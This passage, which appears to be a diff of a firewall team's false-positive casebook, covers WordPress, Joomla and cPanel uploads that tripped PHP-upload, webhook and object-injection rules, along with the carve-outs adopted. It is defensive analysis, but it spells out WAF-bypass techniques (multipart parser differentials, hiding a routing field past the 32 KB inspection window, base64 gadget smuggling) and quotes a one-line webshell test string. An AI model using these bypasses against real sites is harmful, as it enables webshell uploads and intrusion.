 ### FP case 6 — `WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG` on WP migration-plugin imports
 
-**Shape:** repeated `block` events (rule 402, reason
-`WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG`) on
-`POST /wp-admin/admin-ajax.php?action=WMW_import` of `mtgtravel.gr`, from a
-single real Greek admin (2.85.210.197, AS6799 OTEnet, Chrome 150). Referer was
-the plugin's own admin page (`admin.php?page=WMW_import`); the same IP had a
-fully authenticated wp-admin browsing session around the hits (themes.php,
-dashboard widgets, load-styles.php all 200). The import ran as a ~90-minute
-stream of chunked `multipart/form-data` POSTs, each large enough that the edge
-buffered the body to disk (`client_body_temp` warnings in error.log).
+**Shape:** repeated `block` (rule 402) on
+`POST /wp-admin/admin-ajax.php?action=WMW_import` from one Greek admin with a
+live wp-admin session, Referer `admin.php?page=WMW_import`. The Website
+Migration plugin uploads a whole-site backup as a ~90-minute stream of
+chunked `multipart/form-data` POSTs, each large enough to spool to disk
+(`client_body_temp`).
 
-**Root cause:** the Website Migration WordPress plugin (`WMW_*` admin-ajax
-actions) uploads a whole-site backup in chunks. A WordPress site backup *is*
-PHP source, and the archive chunks carry literal `<?php` bytes in the
-multipart body, so rule 402's byte scan fires — on content that is the
-upload's whole point. Same class as the `update.php?action=upload-plugin` /
-Code Snippets carve-outs (`is_known_legit_php_upload_endpoint`): the
-plugin/theme/backup/migration ecosystem legitimately ships PHP-bearing
-payloads. Note the family is autoblock-armed (`UPLOAD_CONTENT` is a Phase-1
-edge-`block` family), so each edge hit also feeds `waf_security` — a customer
-mid-migration can earn a 6h nft ban on top of the edge TTL block.
+**Why it tripped:** a WordPress backup *is* PHP source, so the chunks carry
+literal `<?php`. Rule 402 deliberately has no admin-ajax carve-out (upload
+exploits land there), and the legit-PHP-upload allowlist
+(`is_known_legit_php_upload_endpoint`) knows only the installer endpoints.
+`UPLOAD_CONTENT` is autoblock-armed, so a customer mid-migration can also
+earn a 6 h nft ban.
 
-**Why we missed it:** rule 402 deliberately has no admin-ajax carve-out
-(upload exploits land exactly there), and the existing legit-PHP-upload
-allowlist is keyed on the two installer endpoints only. Migration plugins
-use plugin-specific admin-ajax actions the edge has never heard of.
-
-**Fix — operator-side, temporary, rule-scoped exclusion for the duration of
-the migration.** There is **no safe fully-automatic code carve-out** for this
-case (see the rejected-approaches analysis below); the operator, who knows a
-migration is running, is the right actor:
+**Fix: operator-side, temporary, rule-scoped exclude** for the length of the
+migration. The operator knows a migration is running; the edge cannot:
 
 ```
 cfm webtop waf exclude add    /wp-admin/admin-ajax.php --type path --rule 402 --scope mtgtravel.gr
@@ -607,464 +389,330 @@ cfm webtop waf exclude add    /wp-admin/admin-ajax.php --type path --rule 402 --
 cfm webtop waf exclude remove /wp-admin/admin-ajax.php --type path --rule 402 --scope mtgtravel.gr
 ```
 
-`--scope <vhost>` pins the exclude to the one migrating site — minimal
-surface. Omit it and the path+rule exclude applies on every vhost (still
-rule-scoped, but fleet-wide for that path). If the backup chunks also trip the
-other block-tier body scanners — likely in practice, since a full-site backup
-carries `php://input`/`php://temp` strings (→ `php_wrappers`, rule **305**,
-armed→block, and it runs *before* 402), a SQL dump (→ `sqli`, **301**), and
-serialized PHP objects from the DB (→ `php_object_injection`, **329**) — add
-those ids to the same temporary exclude and remove them all afterwards:
+`--scope <vhost>` pins it to the one site; without it the path+rule exclude
+applies on every vhost. A full-site backup also tends to trip 305
+(`php://input` strings, runs before 402), 301 (a SQL dump) and 329
+(serialized objects): add them to the same temporary exclude
+(`--rule 402 --rule 305 --rule 301 --rule 329`) and remove them all after.
+Every other rule, path and vhost keeps full inspection. The cfm-admin WAF
+excludes card does the same add/remove.
 
-```
-cfm webtop waf exclude add    /wp-admin/admin-ajax.php --type path --rule 402 --rule 305 --rule 301 --rule 329 --scope mtgtravel.gr
-cfm webtop waf exclude remove /wp-admin/admin-ajax.php --type path --rule 402 --rule 305 --rule 301 --rule 329 --scope mtgtravel.gr
-```
+**Rejected: an automatic `action=`-keyed carve-out.** A draft keyed on
+`action=WMW_import` shipped on the branch and was reverted after adversarial
+review. It is unsound for two independent reasons:
 
-With `--scope`, the exclude is pinned to one vhost, one path, and only the
-listed rules: the rest of the WAF still inspects those requests (traversal,
-XSS, CVE detectors, everything not listed), every other path on the same vhost
-keeps all rules, and every other vhost is untouched entirely. Removing it after
-the import restores full enforcement. (The same add/remove is available from
-the cfm-admin WAF excludes card — type/value plus the rule-IDs and scope-host
-fields.)
-
-**Rejected — an automatic content-keyed exemption (why it cannot be safe
-here).** The tempting fix is a fleet-wide rule keyed on the WordPress action
-(`action=WMW_import`) that demotes the upload scanners to logonly. A first
-draft of exactly this shipped on the branch and was **reverted after
-adversarial review** — the approach is unsound at two independent levels:
-
-1. **Parser differential (admin-ajax dispatches on `$_REQUEST['action']`).**
-   The query action is not the effective action: a POST-body `action` field
-   overrides the query (PHP `request_order=GP`, last duplicate wins). Any
-   matcher must therefore reconstruct PHP's `parse_str` + rfc1867 multipart
-   parsing in Lua — and an adversarial pass found **four** confirmed
-   request differentials against real PHP where the matcher computed
-   `WMW_import` while PHP dispatched an attacker-chosen `wp_ajax_nopriv_*`
-   handler: an in-data fake `--boundary--` (substring, not line-anchored,
-   match), a decoy `filename=` in an unrelated part header, a bare-`LF`
-   header terminator, and an all-`LF` body — each exploiting a body-walker
-   that *fails open* (grants the exemption) on any parse ambiguity. Matching
-   PHP's lenient line-oriented parser byte-for-byte in Lua is a losing game.
+1. **Parser differential.** admin-ajax dispatches on `$_REQUEST['action']`,
+   and a POST-body `action` overrides the query (`request_order=GP`, last
+   duplicate wins). A matcher must rebuild PHP's `parse_str` + rfc1867 in
+   Lua, and review found four request differentials against real PHP where
+   the matcher saw `WMW_import` and PHP dispatched an attacker's
+   `wp_ajax_nopriv_*` handler: an in-data fake `--boundary--`, a decoy
+   `filename=` in another part, a bare-`LF` header terminator, an all-`LF`
+   body. Each exploited a walker that failed open on ambiguity.
 2. **Windowed body vs full-body dispatch (fatal even with a perfect
-   parser).** The edge only reads the first `waf_body_max_len` (32 KB) of the
-   body; the origin PHP sees all of it. Legit migration chunks are *larger*
-   than the window (they spool to disk — the `client_body_temp` warnings
-   above). So an attacker places a webshell file part in the first 32 KB
-   (fully in-window, exactly what rule 402 would catch) and hides
-   `action=evil` *past* 32 KB. Any matcher that grants when it sees no
-   conflicting action in its window is bypassed; any matcher that fails
-   closed when the body is truncated denies **every** real (large) migration
-   — the exact case the fix exists for. There is no setting of the fail
-   direction that is both safe and useful.
-
-Because the legitimate case is inseparable (at the edge, at request time)
-from the attack, no automatic keying resolves it. The operator exclude wins
-precisely because it is out-of-band: the operator asserts "a migration is
-happening now", scoped and time-bounded, instead of the edge trying to infer
-it from attacker-controlled bytes.
+   parser).** The edge reads the first `waf_body_max_len` (32 KB); PHP reads
+   all of it, and real migration chunks are larger than the window. An
+   attacker puts the webshell in the first 32 KB and `action=evil` past it.
+   Granting when no conflicting action is visible is bypassed; failing closed
+   on a truncated body denies every real migration. No fail direction is both
+   safe and useful.
 
 **Lesson:** chunked migration/backup imports (WMW, All-in-One WP Migration,
-Duplicator, WPvivid …) are a third "legitimately uploads PHP" shape alongside
-installers and code editors — but unlike the installer endpoints
-(`update.php`, which *is* the cookie-auth-gated handler), a plugin-specific
-`admin-ajax.php?action=…` is body-overridable for dispatch and reachable
-pre-auth, so it cannot be safely allowlisted in code. When an exemption would
-have to key on an attacker-movable routing key (`$_REQUEST`-style) *and* the
-verifying scanner reads only a bounded prefix of a body the backend consumes
-in full, the honest answer is an operator-driven, temporary exclusion — not a
-detector carve-out.
+Duplicator, WPvivid) are a third "legitimately uploads PHP" shape, next to
+installers and code editors. When an exemption would key on an
+attacker-movable routing key (`$_REQUEST`-style) **and** the scanner sees
+only a prefix of a body the backend reads in full, the answer is an
+operator-driven, temporary exclude, not a detector carve-out.
 
 ### FP case 7 — `WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG` on the String Locator file editor
 
-**Shape:** repeated `block` events (rule 402, reason
-`WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG`) on
-`POST /wp-json/string-locator/v1/save`, from a single real authenticated admin
-(e.g. 2.85.210.197, AS6799 OTEnet — the same operator as case 6, different
-site/plugin). Referer is the plugin's own editor page and the IP has a live
-wp-admin session around the hits. After the saves are blocked the admin falls
-back to cPanel File Manager to edit the file — the tell that the block disrupted
-legitimate work.
+**Shape:** `block` (402) on `POST /wp-json/string-locator/v1/save` from an
+authenticated admin, Referer the plugin's editor. Blocked, the admin fell
+back to cPanel File Manager.
 
-**Root cause:** String Locator is an in-browser theme/plugin **file editor**: it
-searches PHP source across the install and, on Save, POSTs the *entire file being
-edited* (`header.php` / `footer.php` / `functions.php` …) back to its REST
-endpoint. That body starts with `<?php`, so rule 402's byte scan fires on the
-content that is the editor's whole purpose. (The search leg can also carry PHP
-tokens like `<?php` / `$_POST`, since searching *for* them is the point.) Same
-class as the installer / Code Snippets carve-outs.
+**Why it tripped:** String Locator is an in-browser theme/plugin file editor.
+Save POSTs the whole edited file (`functions.php` …), which starts with
+`<?php`.
 
-**Fix — allowlist in code (unlike case 6).** Added to
-`is_known_legit_php_upload_endpoint` (`configs/lua/cfm_waf_util.lua`), keyed on
-the plugin's REST namespace prefix:
+**Fix (in code, unlike case 6):** `is_known_legit_php_upload_endpoint`
+(`cfm_waf_util.lua`) matches `^/wp%-json/string%-locator/`. Like every entry
+there it stands down the body-PHP scanners on that path: 401, 402, 403, the
+431-436 and 439 `WAF_BACKDOOR` body rules. Every URI rule still runs, as do
+414 (its own media allowlist) and 437/438 (their own `/wp-admin/` carve-out).
 
-```
-if u:match("^/wp%-json/string%-locator/") then return true end
-```
+**Why it is safe here and not in case 6:**
+1. *Routing key.* The REST path is what routes the request; no body field
+   makes PHP dispatch another handler, and it is in the request line, never
+   past the body window.
+2. *Reachability.* `/save` sits behind the plugin's `permission_callback`
+   (`edit_themes` / `manage_options`), the same trust boundary as the
+   installer and Code Snippets. admin-ajax also serves pre-auth `nopriv`
+   handlers.
 
-Like every entry in that helper, matching stands down the full **body-PHP
-scanner set** on the path — the upload scanners **401** (filename), **402**
-(content), **403** (obfuscation) and the **431-436** and **439** `WAF_BACKDOOR`
-body detectors — because a saved theme/plugin file is arbitrary PHP that trips
-more than a bare `<?php` (a save whose content used `$_POST` would otherwise eat
-a 434 block on the next click). Every **URI-based** rule (traversal, XSS, SQLi,
-RCE, the CVE detectors, long-path …) still runs, as do rule **414** (php-in-zip,
-gated by a separate media-asset allowlist) and **437/438** (encoded-opener,
-which keep their own `/wp-admin/` carve-out).
+The edge does not, and cannot, authenticate the caller (a WP logged-in cookie
+is HMAC-signed with per-site secrets the edge does not hold). It does not
+need to: without the plugin the path 404s; an unauthenticated caller is
+refused by the plugin; a holder of `edit_themes` can already write PHP with
+the native theme editor.
 
-**Why this one is safe in code but the WMW migration (case 6) is not.** The two
-rejected-approach failures of case 6 both turn on the *discriminator* being
-attacker-controlled at the edge — neither applies here:
-
-1. *Routing key.* WMW is keyed on `admin-ajax.php?action=WMW_import`, and
-   admin-ajax dispatches on `$_REQUEST['action']`, which a POST-body field
-   overrides (PHP `request_order=GP`) — the query action is forgeable. String
-   Locator is keyed on the **REST request path**, which is exactly what routes
-   the request; no body field makes PHP dispatch a *different* handler. The
-   discriminator is unforgeable and always fully visible (it is in the request
-   line, not past the 32 KB body window).
-2. *Reachability.* `admin-ajax.php` also serves **unauthenticated**
-   `wp_ajax_nopriv_*` handlers, so a pre-auth attacker can reach it; exempting
-   rule 402 there (on a forgeable key) opens a real pre-auth webshell-upload
-   path. String Locator's `/save` sits behind the plugin's own
-   `permission_callback` (an `edit_themes`/`manage_options` capability) — the
-   same trust boundary we already accept for the installer and Code Snippets.
-   We do not bypass that check; we only stand down the *body-PHP scanners*, and
-   every URI-based WAF rule still runs.
-
-**Note — we do NOT (and cannot) authenticate the caller at the edge.** The
-carve-out does not try to prove the request is "really an admin", and does not
-need to: on a site *without* the plugin the path 404s (the exemption is inert);
-an unauthenticated caller is rejected by the plugin's own permission check (body
-never written); and an attacker who *does* hold `edit_themes` can already write
-PHP via the native WP Theme Editor, so rule 402 on this one path was never the
-load-bearing control. A WordPress logged-in cookie can't be validated here
-anyway — it is HMAC-signed with per-site `wp-config.php` secrets plus per-user
-session tokens in that site's DB, none of which the shared edge holds, and its
-mere presence is attacker-supplied. The WAF sits *below* app auth by design;
-safety here comes from the exemption being narrow (one path, PHP-body scanners
-only) over an endpoint that carries its own downstream enforcement — not from
-the edge guessing who is calling. This is the general rule for a path-keyed
-PHP-upload carve-out: it is only safe when the target endpoint enforces its own
-auth and standing down the body-PHP scanners there grants nothing an
-already-authorized user couldn't do by design.
+**Lesson:** a path-keyed PHP-upload carve-out is safe only when the endpoint
+enforces its own auth and standing down the body-PHP scanners grants nothing
+an authorised user could not already do.
 
 ### FP case 8 — `WAF_BAD_UA` (201) challenging payment-gateway webhooks
 
-**Shape:** a steady `challenge` stream (rule 201, reason
-`WAF_BAD_UA:UA_EMPTY+NO_ACCEPT+NO_REFERER:score=4`) on rigel from 2026-09-22
-~14:50 UTC: Viva Wallet (`mail.notify.viva.com`, 51.138.37.238 /
-20.54.89.16) POSTing `application/json` with no User-Agent, Accept or Referer
-to three shops — `eloop.gr/includes/payments/viva/viva_webhook.php`,
-`mountain-house.gr` and `megashopgr.gr` at `/index.php?wc-api=wc_vivawallet&vivawallet=webhook`.
-Every webhook got the 303-to-challenge and then a 403; ~440 payment
-notifications in the first day. A server-to-server POST can never solve a
-challenge, so the tier made no difference: challenge == block here.
+**Shape:** Viva Wallet webhooks (`application/json`, no User-Agent, Accept or
+Referer) to `…/viva_webhook.php` and
+`/index.php?wc-api=wc_vivawallet&vivawallet=webhook` on three shops. ~440
+payment notifications a day got a challenge, which a server-to-server POST
+can never solve.
 
-**Root cause:** the 201 scorer drops its two browser-behaviour penalties
-(NO_ACCEPT, NO_REFERER) on machine-style endpoints (`is_machine_style_endpoint`),
-a list that exists for exactly these routes — but two of its entries could
-never match them. The detector gets the decoded PATH only (`ngx.var.uri`), so
-the `/?wc-api=` entry — WooCommerce's legacy API route, where gateways built
-from `home_url()` receive callbacks — matched nothing, ever. And `/webhook`
-required a leading slash, missing a receiver named after its gateway
-(`viva_webhook.php`).
+**Why it tripped:** 201 drops its NO_ACCEPT / NO_REFERER penalties on
+machine-style endpoints (`is_machine_style_endpoint`), but two entries could
+never match: the detector gets the decoded path only, so `/?wc-api=` matched
+nothing, and `/webhook` needed a leading slash (`viva_webhook.php` has none).
 
 **Fix (in code):** `webhook` matches anywhere in the path (the per-provider
-`/stripe/webhook`, `/github/webhook`, … entries it subsumes were removed), and
-`is_wc_api_callback` reads the QUERY for a non-empty `wc-api` key — only on the
-paths WordPress routes it from (`…/` and `…/index.php`), so `?wc-api=1`
-appended to an arbitrary probe path relaxes nothing. What machine-style
-suppresses is small: the two +1 header penalties. The empty-UA +2, the
-sensitive-file +4 (`/.env`, `/.git/`, …), the score-99 scanner identities and
-every other rule still apply. Fleet check before the change: in 30 days the
-score=4 bucket held ~15 non-Viva hits across all nodes (HNAP1, vpnsvc,
-test-cgi, a Hikvision SDK PUT, no-UA comment spam) — none on a path the new
-patterns match, all pinned as negatives in
+entries it subsumes were removed). `is_wc_api_callback` reads the query for a
+non-empty `wc-api`, only on `…/` and `…/index.php`, so `?wc-api=1` on a probe
+path relaxes nothing. Machine-style suppresses only the two +1 header
+penalties; the empty-UA +2, the sensitive-file +4 and the score-99 scanners
+still apply. 30-day check: ~15 non-Viva score-4 hits fleet-wide, none on a
+path the new patterns match, pinned as negatives in
 `scripts/tests/cfm_waf_bad_ua_machine_endpoint_test.lua`.
+
+**Lesson:** a detector that sees only the decoded path cannot match a query
+pattern; test each allowlist entry against the input the detector really gets.
 
 ### FP case 9 — `WAF_RCE:PHP_OBJECT_INJECTION:BASE64` (329) on Joomla automated updates
 
-**Shape:** a `block` on `POST /index.php?jautoupdate=1`, UA
-`Joomla.org Automated Updates Server`, from 52.14.131.139 (AWS), on
-ardas.gr (2026-09-21). WAF_RCE is autoblock-armed, so the update server was
-nft-banned and pushed to the fleet blacklist for 7 days — no Joomla site on
-the fleet could be auto-updated.
+**Shape:** `block` on `POST /index.php?jautoupdate=1`, UA
+`Joomla.org Automated Updates Server`, from AWS. WAF_RCE is armed, so the
+update server was nft-banned and pushed to the fleet blacklist for 7 days:
+no Joomla site could auto-update.
 
-**Root cause:** Joomla 5.4+ automated core updates drive the extraction script
-through the FRONT controller. Joomla's `index.php` does
-`if (!empty($_GET['jautoupdate']) && is_file(…/update.php)) { require_once …/com_joomlaupdate/extract.php; die(); }`,
-and `extract.php` reads only `$_REQUEST['password' | 'instance' | 'task']`,
-where `instance` is `base64(serialize(ZIPExtraction))` — a genuine object
-marker. The Akeeba carve-out (FP 2026-07-17) keys on the admin-side
-`com_joomlaupdate/extract.php` path; this is the same script through
-`/index.php`.
+**Why it tripped:** Joomla 5.4+ runs the extraction script through the front
+controller (`index.php` requires `com_joomlaupdate/extract.php` when
+`jautoupdate` is set). `extract.php` reads `password`, `instance`, `task`,
+and `instance` is `base64(serialize(ZIPExtraction))`, a genuine object
+marker. The Akeeba carve-out keyed on the admin-side `extract.php` path.
 
 **Fix (in code), keyed on the payload, not the route.** A path key would open
-rule 329 for the whole site (every Joomla request is `/index.php`), and
-`?jautoupdate=1` alone is attacker-appendable (WordPress ignores it and hands
-the body to its plugins). `is_joomla_autoupdate_request` passes a request only
-when ALL hold: `…/index.php` with a non-empty `jautoupdate` in the query
-(Joomla's own `!empty()`, last duplicate wins); every query/body parameter is
-one `extract.php` reads, each exactly once; `task` is one of its three verbs
-(`startExtract`, `stepExtract`, `finalizeUpdate`); the other values
-(`password`, `jautoupdate`) carry no serialized gadget — an object/enum/
-reference marker in the raw value **or** in its full base64 decode (a WordPress
-plugin that `unserialize()`s the param is the threat, and a gadget nested one
-byte inside an array base64s to something the base detector's prefix-gated scan
-misses); and every object in the fully decoded `instance` (form-decoded, then
-base64) is a class `extract.php` itself allows — its `unserialize()` passes
-`allowed_classes = [ZIPExtraction, stdClass]`, and an `E:` enum or `r:`/`R:`
-reference (never in a real blob) disqualifies. Every class is checked, not the
-first: on WordPress a `ZIPExtraction` with a nested gadget object would still
-instantiate the gadget. The decode has to match PHP's, so the
-check reads each class name by its length prefix as PHP does, and takes only
-canonical base64 — nginx's decoder stops at the first `=` while PHP's
-non-strict `base64_decode()` skips it and carries on, so `b64(clean)=b64(gadget)`
-would otherwise show the WAF the clean half only. Whatever it can't vouch for
-falls through to the detector as before: a body the WAF only saw part of
-(Content-Length ≠ the body it read — the WAF reads a capped prefix), a
-non-form body, a repeated parameter, a key PHP would rewrite (NUL, leading
-space, `.`, `[`), a value that does not decode, a marker it can't parse
-strictly. Tests:
+329 for every Joomla request, and `?jautoupdate=1` is attacker-appendable
+(WordPress ignores it). `is_joomla_autoupdate_request` passes only when all
+hold:
+- `…/index.php` with a non-empty `jautoupdate` (last duplicate wins);
+- every query/body parameter is one `extract.php` reads, each exactly once;
+- `task` is `startExtract`, `stepExtract` or `finalizeUpdate`;
+- `password` / `jautoupdate` carry no object/enum/reference marker, raw or in
+  their full base64 decode;
+- every object in the fully decoded `instance` is `ZIPExtraction` or
+  `stdClass` (`extract.php`'s `allowed_classes`); any `E:` or `r:`/`R:`
+  disqualifies, and every class is checked, not the first.
+
+The decode matches PHP's: class names by their length prefix, canonical base64
+only (nginx stops at the first `=`, PHP's non-strict decode carries on, so
+`b64(clean)=b64(gadget)` would otherwise hide the gadget). Anything it cannot
+vouch for falls through to the detector: a partly read body (Content-Length
+≠ what was read), a non-form body, a repeated parameter, a key PHP rewrites
+(NUL, leading space, `.`, `[`), a value that does not decode. Tests:
 `scripts/tests/cfm_waf_object_injection_joomla_autoupdate_test.lua`.
+
+**Lesson:** when the legitimate request carries a real attack marker, key the
+exemption on the full payload matching exactly what the consumer accepts.
 
 ### FP case 10 — `WAF_CMD_PARAM:CMD_CMD` (310) on WP File Manager
 
 **Shape:** `challenge` on
-`/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce=…&cmd=rm` (and
-`cmd=mkdir`) from a site admin on glaveris.gr, referer
-`admin.php?page=wp_file_manager` — every delete / new folder in the plugin.
+`/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce=…&cmd=rm`
+(and `cmd=mkdir`) from a site admin: every delete / new folder in the
+plugin.
 
-**Root cause:** the WordPress "File Manager" plugin (wp-file-manager) is
-elFinder, whose verbs `rm` / `mkdir` / `ls` / `chmod` collide with shell
-command names. The existing elFinder carve-out recognised only Joomla's
-`task=connector`.
+**Why it tripped:** wp-file-manager is elFinder, whose verbs `rm` / `mkdir` /
+`ls` / `chmod` are shell command names. The elFinder carve-out knew only
+Joomla's `task=connector`.
 
-**Fix (in code):** the same carve-out accepts the plugin's admin-ajax action —
-only on `…/wp-admin/admin-ajax.php`, and still only for a PRISTINE single
-elFinder verb. The query `action` is not routing proof (a body field overrides
-it, case 6), but the carve-out needs none: a bare verb carries no payload on
-any handler, while a metacharacter, a path or a non-verb word fires as before.
+**Fix (in code):** the carve-out also accepts the plugin's admin-ajax action,
+only on `…/wp-admin/admin-ajax.php` and only for a pristine single elFinder
+verb. The query `action` is no routing proof (case 6), but none is needed: a
+bare verb carries no payload on any handler, while a metacharacter, a path or
+a non-verb still fires.
+
+**Lesson:** a carve-out that only admits payload-free values does not need a
+trustworthy routing key.
 
 ### FP case 11 — cPanel File Manager save / upload on `cpanel.X:443` (404 / 402 / 401)
 
-**Shape:** orion, 2026-09-28, account paparazi on `cpanel.zenogroup.gr`. The
-File Manager editor's **Save Changes** (`POST /cpsess<N>/json-api/cpanel`,
-form-urlencoded, the PHP source file as the body) got 403 from rule 404
-`WAF_PHP_WEBSHELL_BODY:RAW_EXEC`: `challenge_v2` by default, turned into
-`block` by `post_clearance_action` because the client held a clearance and
-the family is high-risk. The editor reports the 403 as "Your login session has
-expired", and cPanel's `access_log` has no save request at all. Uploading
-`.php` files (`/cpsess<N>/execute/Fileman/upload_files`) got 403 from 402
-`UPLOAD_PHP_TAG` and 401 `UPLOAD_FNAME`. After a fresh login, the same save
-got a `challenge_v2` 303, which an XHR cannot solve.
+**Shape:** a cPanel user on `cpanel.<domain>`. File Manager's **Save
+Changes** (`POST /cpsess<N>/json-api/cpanel`, form-urlencoded, the PHP file as
+the body) got 403 from 404 `WAF_PHP_WEBSHELL_BODY:RAW_EXEC`: `challenge_v2`,
+turned into `block` by `post_clearance_action` (cleared client, high-risk
+family). The editor reports it as "Your login session has expired", and
+cPanel's `access_log` shows no save. `.php` uploads
+(`/cpsess<N>/execute/Fileman/upload_files`) got 402 and 401. After a fresh
+login the save got a `challenge_v2` 303, which an XHR cannot solve.
 
-**Root causes and fixes (in code):**
+**Why it tripped, and the fixes (in code):**
 
-1. *Detector:* `has_php_callable` matched `$this->db->exec(` (PDO) as the
-   global `exec()`. `<?php` (+2) plus exec (+3) reached the threshold of 5.
-   These are no longer counted:
-   - `->name(` / `?->name(` with the arrow glued to the name, and whitespace
-     or a newline allowed before the arrow (the PSR-12 fluent chain
-     `$this->db\n    ->exec(`), unless the `-` belongs to `--`;
-   - `::name(` with an operand (identifier char, `)`, `]`, `}`) directly
-     before;
-   - a declaration `function name(` / `function &name(` on one line.
-
-   Three review passes shaped this. A whitespace-tolerant first version let a
-   comment steer it: `<?php //->\nsystem($_GET[c]);` scored 4 and passed. The
-   next version let `$i-->system(` through (PHP: `($i--) > system(…)`). So the
-   arrow must touch the name, and `-->` counts. `$db -> exec(` (space after
-   the arrow) and a declaration split across lines still count (fail closed).
-   The global builtin, `@exec(` and `\exec(` still count, and the reason tag
-   (`RAW_SYSTEM_GET`, …) names only a call that scored (severity test 67b).
-2. *Edge parity:* the panel listeners (2083/2087/2096) always passed cPanel's
-   authenticated API / SSO / transfer endpoints straight through
-   (`cfm_panel.lua` step 1, `cfm_panel_hosts.is_panel_api_or_sso`, now the
-   single copy of that list). The proxy subdomain on 80/443 ran the full WAF
-   and the vhost challenge on the same request. `cfm.lua` Step 0d now passes
-   them straight to origin, under three gates:
+1. *Detector.* `has_php_callable` read `$this->db->exec(` (PDO) as the global
+   `exec()`: `<?php` (+2) plus exec (+3) hit the threshold of 5. No longer
+   counted: `->name(` / `?->name(` with the arrow glued to the name
+   (whitespace or a newline allowed before the arrow, the PSR-12 fluent
+   chain), unless the `-` belongs to `--` (`$i-->system(` is
+   `($i--) > system(…)`); `::name(` right after an operand; a one-line
+   declaration `function name(` / `function &name(`. Still counted (fail
+   closed): `$db -> exec(` (space after the arrow), a declaration split
+   across lines, the global builtin, `@exec(`, `\exec(`. A whitespace-tolerant
+   draft let a comment steer it (`<?php //->\nsystem($_GET[c]);` scored 4).
+   The reason tag names only a call that scored (severity test 67b).
+2. *Edge parity.* The panel listeners (2083/2087/2096) always passed cPanel's
+   API / SSO / transfer endpoints through (`cfm_panel.lua` step 1,
+   `cfm_panel_hosts.is_panel_api_or_sso`, the single copy of that list). The
+   proxy subdomain on 80/443 ran the full WAF and vhost challenge on the same
+   request. `cfm.lua` Step 0d now passes them to origin under three gates:
    - **host:** `cpanel.` / `whm.` / `webmail.` (not `mail.` / `webdisk.`) on
      a registrable domain: at least three labels, and exactly three only if
      the middle one is not a second-level name under a two-letter ccTLD. A
-     name that is prefix + public suffix (`webmail.gr`, `cpanel.com.gr`,
-     `whm.co.uk`) can only be a tenant's own domain, and that vhost comes
-     before cPanel's proxy vhost. This is a heuristic list
-     (`SECOND_LEVEL_LABELS`), not the Public Suffix List.
-   - **path:** only the `/cpsess<N>/{json-api,execute,xml-api,login,websocket}/`
-     subset of the ports' list (`is_session_api`, case-insensitive, because the
-     Go engine only sees lowercased URIs). That subset is all of
-     cPanel's own UI traffic, and `/cpsess<digits>/` is cPanel's alone. The rest
-     of the list (`/api/`, `/session`, `/execute/`, `/json-api/`) are ordinary
-     app route names. Token API clients use `:2083`/`:2087`, where the full
-     list still applies.
-   - **node:** cPanel with `proxysubdomains=1` **and**
-     `proxysubdomainsoverride=0` in `/var/cpanel/cpanel.config`
-     (`proxy_hosts_reach_panel`; one worker reads it per 60 s into the
-     `cfm_decisions` dict, stamped with the read time, so a change reaches
-     every worker within 60 s; unreadable or absent = off). Only then does every
-     such Host reach cpsrvd: cPanel's catch-all proxy vhost (`ServerAlias
-     cpanel.* whm.* webmail.* …`, bound on every IP) takes it, and no tenant
-     can own a real `webmail.x` subdomain. The override, cPanel default 1,
-     allows exactly that. Elsewhere (DirectAdmin, proxy subdomains off,
-     override on) Step 0d stays off. Fix 1 still covers the PDO save there.
+     prefix + public suffix (`webmail.gr`, `cpanel.com.gr`, `whm.co.uk`) is a
+     tenant's own domain, whose vhost comes before cPanel's proxy vhost. The
+     list is a heuristic (`SECOND_LEVEL_LABELS`), not the Public Suffix List.
+   - **path:** only `/cpsess<N>/{json-api,execute,xml-api,login,websocket}/`
+     (`is_session_api`, case-insensitive because the Go engine sees
+     lowercased URIs), the subset of the ports' list that is cPanel's own UI.
+     `/cpsess<digits>/` is cPanel's alone; the rest of the list (`/api/`,
+     `/session`, `/execute/`, `/json-api/`) are ordinary app route names.
+     Token API clients use `:2083`/`:2087`, where the full list applies.
+   - **node:** `proxysubdomains=1` **and** `proxysubdomainsoverride=0` in
+     `/var/cpanel/cpanel.config` (`proxy_hosts_reach_panel`; one worker reads
+     it every 60 s into `cfm_decisions`; unreadable or absent = off). Only
+     then does every such Host reach cpsrvd: the catch-all proxy vhost takes
+     it and no tenant can own a real `webmail.x`. Elsewhere (DirectAdmin,
+     proxy subdomains off, override on) Step 0d is off, and fix 1 still covers
+     the PDO save.
 
-   It runs after Step 0b (UA emergency) and Step 0c (fingerprint `deny`), so
-   those operator-armed denies still apply. It also runs after the POST
-   resume, so a resumed save is replayed with its body. Like the panel ports,
-   it **skips the WAF, the challenge and Step 3**, so traffic rules
-   (block/throttle/challenge) and the daemon's per-IP L7 decision do not
-   apply to these paths on the web edge either. cpsrvd still authenticates
-   every request, and kernel (nft) blocks, autoblock included, still apply.
-   The decision engine mirrors all three gates (`panel_session_api.go`, applied
-   in `engine.go` ingest after the access ring, so `edge_access_tail` still
-   shows these requests), so File Manager traffic does not score its user's
-   IP as a scanner. The node-config gate matters on this side too: without
-   it, a spoofed `Host: cpanel.x` on a node where the edge does NOT pass
-   these paths would hide a flood from the engine. Parity is pinned twice:
-   the Go test reads the three lists out of `cfm_panel_hosts.lua`, and both
-   sides run the vectors in `scripts/tests/fixtures/panel_session_api.txt`.
-   `cfm_panel.lua` without the module passes nothing through (fail closed; ERR
-   at most once a minute). A worker still holding an older copy (the
-   post-upgrade edge reload failed) re-loads the file on disk, at most once
-   a minute.
+   **Why the gates matter:** without them a spoofed `Host: cpanel.x` would
+   walk past the WAF into a docroot. Step 0d runs after Step 0b (UA
+   emergency), 0c (fingerprint `deny`) and the POST resume, and, like the
+   panel ports, **skips the WAF, the challenge and Step 3** (traffic rules,
+   the per-IP L7 decision). cpsrvd still authenticates every request; nft
+   blocks, autoblock included, still apply. The decision engine mirrors all
+   three gates (`panel_session_api.go`, in `engine.go` ingest after the access
+   ring, so `edge_access_tail` still shows these requests), so File Manager
+   traffic does not score its user as a scanner; the node gate matters there
+   too, or a spoofed Host would hide a flood from the engine. Parity: the Go
+   test reads the lists out of `cfm_panel_hosts.lua`, and both sides run
+   `scripts/tests/fixtures/panel_session_api.txt`. `cfm_panel.lua` without the
+   module passes nothing (fail closed, ERR at most once a minute); a worker
+   with an older copy re-loads the file at most once a minute.
    Residual: a domain whose own vhost has a wildcard `*.example.com` alias
